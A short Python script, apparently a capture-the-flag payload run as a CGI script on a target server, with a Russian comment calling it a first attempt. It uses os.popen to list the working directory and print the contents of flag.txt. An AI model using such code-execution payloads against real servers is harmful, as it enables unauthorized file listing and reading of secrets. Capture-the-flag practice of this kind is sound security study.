import os

# Попытка 1: Просто вывести список файлов (если это CGI)
print("Content-Type: text/plain\n") 
try:
    print("--- DIRECTORY LISTING ---")
    print(os.popen("ls -la").read())
    print("--- FLAG ---")
    print(os.popen("cat flag.txt").read())
except Exception as e:
    print(str(e))
